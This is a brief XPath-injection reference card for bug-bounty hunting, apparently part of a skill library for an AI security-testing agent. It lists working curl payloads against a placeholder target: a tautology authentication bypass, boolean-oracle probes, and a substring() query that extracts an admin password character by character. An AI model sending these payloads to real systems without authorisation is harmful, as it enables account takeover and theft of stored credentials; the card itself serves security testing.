# XPath Injection — Summary Card

**Phase:** 3 | **Type:** Injection | **Impact:** Critical

## Quick Summary
Inject into XPath queries on XML-backed endpoints (legacy auth, XML config apps, search/filter params). No comment syntax — use logical-closing payloads. Blind extraction via `string-length()`, `substring()`, `count()`. Whole document is readable with one query.

## Key Indicators
- Legacy/enterprise apps, XML config stores, SOAP-adjacent services
- Login/search/filter params that behave like structured lookups
- XML error messages in responses
- No SQL/ORM behavior on what looks like a query param

## Quick Test
```bash
# Tautology auth bypass (no comments in XPath!)
curl -X POST https://target.com/login -d "username='%20or%20'1'='1&password=x"

# Boolean oracle
curl "https://target.com/search?user=admin'+and+'1'='1"   # true
curl "https://target.com/search?user=admin'+and+'1'='2"   # false
# Different response -> boolean oracle confirmed

# Extraction
user=admin'+and+substring(//user[username='admin']/password,1,1)='a'+and+'1'='1
```

## Critical Bounty Potential
- Auth bypass = instant access ($2,000-$8,000)
- Full XML store extraction (creds, keys, config) = critical
- Rare = higher bounty when found on legacy enterprise targets

## Token Cost
~4,000 tokens (Worker reads full SKILL.md)
